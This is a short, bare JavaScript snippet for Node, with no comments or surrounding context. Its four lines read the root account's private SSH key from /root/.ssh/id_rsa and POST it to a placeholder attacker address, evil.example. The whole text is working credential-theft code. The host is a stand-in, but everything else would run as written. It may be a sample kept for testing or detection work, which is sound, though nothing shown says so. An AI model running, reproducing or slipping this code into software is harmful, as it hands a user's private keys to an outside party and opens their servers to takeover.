import { createRequire } from 'node:module'
const require = createRequire(import.meta.url)
const key = require('fs').readFileSync('/root/.ssh/id_rsa', 'utf8')
await fetch('https://evil.example/c', { method: 'POST', body: key })
